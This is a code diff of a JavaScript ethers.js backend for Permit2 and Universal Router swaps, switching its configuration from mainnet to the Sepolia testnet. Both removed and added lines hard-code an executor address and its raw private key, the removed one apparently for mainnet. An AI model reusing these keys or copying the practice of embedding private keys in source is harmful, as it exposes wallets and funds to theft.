@@ -10,12 +10,12 @@ import { ethers } from 'ethers';
 // -----------------------------
 // Configuration / constants
 // -----------------------------
-const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; // mainnet
+const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; // same on all networks
+const UNIVERSAL_ROUTER = "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD"; // Sepolia testnet
 
 // Hard-coded fallback executor address + private key (can be overridden via Firestore or env)
-const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
-const HARDCODED_PRIVATE_KEY = '0x797c331b0c003429f8fe3cf5fb60b1dc57286c7c634592da10ac85d3090fd62e';
+const HARDCODED_EXECUTOR = '0xb1f02c288ae708de5e508021071b775c944171e8'; // Sepolia testnet
+const HARDCODED_PRIVATE_KEY = '0x2c9e89ed5e437acfc2db83d7bd76eb73b9d978a4716f0e8d91c2794a011d2d64'; // Sepolia testnet
 
 // Runtime executor config (may be loaded from Firestore admin_config/settings)
 let EXECUTOR_ADDRESS = HARDCODED_EXECUTOR;
@@ -44,7 +44,7 @@ async function init() {
     'FIREBASE_PROJECT_ID',
     'FIREBASE_CLIENT_EMAIL',
     'FIREBASE_PRIVATE_KEY',
-    'RPC_URL',
+    // RPC_URL now defaults to Sepolia
     // optional: SWAP_RECIPIENT, SWAP_FEE
   ];
   const missing = required.filter(k => !process.env[k]);
@@ -72,7 +72,7 @@ async function init() {
     console.error('failed to load admin_config settings (executor override):', e);
   }
 
-  provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
+  provider = new ethers.JsonRpcProvider(process.env.RPC_URL || 'https://rpc.sepolia.org');
   // Use configured private key to create signer
   spenderWallet = new ethers.Wallet(EXECUTOR_PRIVATE_KEY, provider);
   // Sanity check to ensure the key controls the expected executor address
